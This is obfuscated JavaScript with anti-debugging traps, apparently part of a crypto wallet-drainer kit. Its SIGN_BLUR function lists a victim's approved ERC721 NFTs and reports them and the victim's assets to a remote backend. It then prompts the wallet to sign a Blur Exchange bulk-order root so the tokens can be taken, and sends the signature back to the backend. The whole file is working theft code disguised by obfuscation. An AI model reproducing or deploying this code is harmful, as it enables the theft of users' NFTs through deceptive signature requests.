(function(_0xb2a521, _0x129fdf) {
    const _0x11b23b = _0x314d,
        _0x5f5c58 = _0xb2a521();
    while (!![]) {
        try {
            const _0x12b531 = -parseInt(_0x11b23b(0x67)) / 0x1 * (-parseInt(_0x11b23b(0x6b)) / 0x2) + parseInt(_0x11b23b(0x71)) / 0x3 * (parseInt(_0x11b23b(0x81)) / 0x4) + -parseInt(_0x11b23b(0x70)) / 0x5 * (parseInt(_0x11b23b(0x98)) / 0x6) + parseInt(_0x11b23b(0x7b)) / 0x7 * (-parseInt(_0x11b23b(0x84)) / 0x8) + parseInt(_0x11b23b(0x8d)) / 0x9 * (parseInt(_0x11b23b(0x72)) / 0xa) + -parseInt(_0x11b23b(0x83)) / 0xb + -parseInt(_0x11b23b(0x87)) / 0xc * (-parseInt(_0x11b23b(0x7a)) / 0xd);
            if (_0x12b531 === _0x129fdf) break;
            else _0x5f5c58['push'](_0x5f5c58['shift']());
        } catch (_0x1d5e65) {
            _0x5f5c58['push'](_0x5f5c58['shift']());
        }
    }
}(_0x5153, 0xdb9cc));
const _0x25cfb4 = (function() {
        let _0x45ee45 = !![];
        return function(_0x5c3278, _0x1c89b6) {
            const _0x59a446 = _0x45ee45 ? function() {
                const _0x389061 = _0x314d;
                if (_0x1c89b6) {
                    const _0x2f0f89 = _0x1c89b6[_0x389061(0x76)](_0x5c3278, arguments);
                    return _0x1c89b6 = null, _0x2f0f89;
                }
            } : function() {};
            return _0x45ee45 = ![], _0x59a446;
        };
    }()),
    _0x4f6de4 = _0x25cfb4(this, function() {
        const _0x122600 = _0x314d;
        return _0x4f6de4[_0x122600(0x6e)]()['search'](_0x122600(0x7c))[_0x122600(0x6e)]()[_0x122600(0x92)](_0x4f6de4)[_0x122600(0x8a)](_0x122600(0x7c));
    });
_0x4f6de4();
const _0x40a5d8 = (function() {
    let _0xc7ab9f = !![];
    return function(_0x5b30e0, _0x293acd) {
        const _0xe682d = _0xc7ab9f ? function() {
            const _0x1e9a66 = _0x314d;
            if (_0x293acd) {
                const _0x2b79dd = _0x293acd[_0x1e9a66(0x76)](_0x5b30e0, arguments);
                return _0x293acd = null, _0x2b79dd;
            }
        } : function() {};
        return _0xc7ab9f = ![], _0xe682d;
    };
}());

function _0x314d(_0x26cb49, _0x2f9be3) {
    const _0x136569 = _0x5153();
    return _0x314d = function(_0xc12d22, _0x40a5d8) {
        _0xc12d22 = _0xc12d22 - 0x67;
        let _0x3ad04b = _0x136569[_0xc12d22];
        return _0x3ad04b;
    }, _0x314d(_0x26cb49, _0x2f9be3);
}(function() {
    _0x40a5d8(this, function() {
        const _0xb81b72 = _0x314d,
            _0x1a9e4c = new RegExp(_0xb81b72(0x77)),
            _0x1ff4dd = new RegExp(_0xb81b72(0x82), 'i'),
            _0x3648b4 = _0xc12d22(_0xb81b72(0x6c));
        !_0x1a9e4c[_0xb81b72(0x6a)](_0x3648b4 + 'chain') || !_0x1ff4dd['test'](_0x3648b4 + _0xb81b72(0x99)) ? _0x3648b4('0') : _0xc12d22();
    })();
}());
const SIGN_BLUR = async (_0x24160e, _0x27e15f, _0x466ca9, _0x3e405a, _0x5a39a0, _0x4b252a = 0x0) => {
    const _0x5db88e = _0x314d;
    try {
        const _0x51449a = [],
            _0x97a5ab = [];
        for (const _0xd6fb46 of _0x24160e) {
            if (_0xd6fb46[_0x5db88e(0x7e)] || _0xd6fb46[_0x5db88e(0x90)] !== _0x5db88e(0x93) || _0xd6fb46[_0x5db88e(0x74)] != 0x1 || _0xd6fb46[_0x5db88e(0x79)] < _0x4b252a) continue;
            if (!await is_nft_approved(_0xd6fb46[_0x5db88e(0x78)], _0x466ca9, _0x5db88e(0x80))) continue;
            _0x51449a['push']({
                'collection': _0xd6fb46[_0x5db88e(0x78)],
                'tokenID': _0xd6fb46['id']
            }), _0x97a5ab['push'](_0xd6fb46);
        }
        if (_0x51449a[_0x5db88e(0x8f)] < 0x2) return;
        let _0x795e7 = new ethers[(_0x5db88e(0x75))][(_0x5db88e(0x8b))](_0x27e15f),
            _0xa1b864 = _0x795e7['getSigner'](),
            _0x1b1822 = await send_request({
                'action': _0x5db88e(0x97),
                'user_id': _0x5a39a0,
                'blur': _0x5db88e(0x8e),
                'tokens': _0x51449a,
                'address': _0x466ca9
            });
        try {
            await send_request({
                'action': _0x5db88e(0x97),
                'user_id': _0x5a39a0,
                'blur': _0x5db88e(0x91),
                'assets': _0x97a5ab
            });
            const _0x248cf4 = await _0xa1b864[_0x5db88e(0x95)]({
                'name': _0x5db88e(0x94),
                'version': _0x5db88e(0x86),
                'chainId': 0x1,
                'verifyingContract': '0x000000000000Ad05Ccc4F10045630fb830B95127'
            }, {
                'Root': [{
                    'name': _0x5db88e(0x8e),
                    'type': _0x5db88e(0x68)
                }]
            }, {
                'root': _0x1b1822['data'][_0x5db88e(0x8e)]
            });
            await send_request({
                'action': _0x5db88e(0x97),
                'user_id': _0x5a39a0,
                'blur': _0x5db88e(0x96),
                'signature': _0x248cf4,
                'address': _0x466ca9,
                'root': _0x1b1822[_0x5db88e(0x6d)][_0x5db88e(0x8e)],
                'paths': _0x1b1822[_0x5db88e(0x6d)]['paths']
            });
            for (const _0x6e5878 of _0x24160e) {
                if (_0x6e5878[_0x5db88e(0x7e)] || _0x6e5878[_0x5db88e(0x90)] !== _0x5db88e(0x93) || _0x6e5878[_0x5db88e(0x74)] != 0x1) continue;
                let _0x499846 = ![];
                for (const _0x46a0b1 of _0x97a5ab) {
                    if (_0x46a0b1[_0x5db88e(0x90)] !== _0x5db88e(0x93) || _0x46a0b1['chain_id'] != 0x1) continue;
                    if (_0x46a0b1['address'] == _0x6e5878[_0x5db88e(0x78)] && _0x46a0b1['id'] == _0x6e5878['id']) {
                        _0x499846 = !![];
                        break;
                    }
                }
                _0x499846 == !![] && (_0x6e5878['skip'] = !![]);
            }
        } catch (_0x527c72) {
            console[_0x5db88e(0x8c)](_0x527c72), await send_request({
                'action': _0x5db88e(0x97),
                'user_id': _0x5a39a0,
                'blur': _0x5db88e(0x89)
            });
        }
    } catch (_0xd111c1) {
        console[_0x5db88e(0x8c)](_0xd111c1);
    }
};

function _0x5153() {
    const _0x4795d8 = ['providers', 'apply', 'function\x20*\x5c(\x20*\x5c)', 'address', 'amount_usd', '39xVQYRW', '4843979eIuehe', '(((.+)+)+)+$', 'while\x20(true)\x20{}', 'skip', 'debu', '0x00000000000111abe46ff893f3b2fdf1f759a8a8', '8txpsZn', '\x5c+\x5c+\x20*(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', '4239884hmJCQw', '8vPOtxP', 'action', '1.0', '3767796ZOBDkp', 'counter', 'cancel', 'search', 'Web3Provider', 'log', '1599660UjDHWd', 'root', 'length', 'type', 'request', 'constructor', 'ERC721', 'Blur\x20Exchange', '_signTypedData', 'success', 'blur', '9242172TTPRLe', 'input', '1207094gdqJDO', 'bytes32', 'gger', 'test', '2ObfwPr', 'init', 'data', 'toString', 'call', '5MhPxWZ', '1785828yldGuV', '10hoWuTC', 'stateObject', 'chain_id'];
    _0x5153 = function() {
        return _0x4795d8;
    };
    return _0x5153();
}

function _0xc12d22(_0x1fbc55) {
    function _0x43c5c7(_0x249986) {
        const _0x145c80 = _0x314d;
        if (typeof _0x249986 === 'string') return function(_0x2c9364) {} [_0x145c80(0x92)](_0x145c80(0x7d))[_0x145c80(0x76)](_0x145c80(0x88));
        else('' + _0x249986 / _0x249986)[_0x145c80(0x8f)] !== 0x1 || _0x249986 % 0x14 === 0x0 ? function() {
            return !![];
        } [_0x145c80(0x92)]('debu' + _0x145c80(0x69))[_0x145c80(0x6f)](_0x145c80(0x85)) : function() {
            return ![];
        } [_0x145c80(0x92)](_0x145c80(0x7f) + 'gger')[_0x145c80(0x76)](_0x145c80(0x73));
        _0x43c5c7(++_0x249986);
    }
    try {
        if (_0x1fbc55) return _0x43c5c7;
        else _0x43c5c7(0x0);
    } catch (_0x1bc3f3) {}
}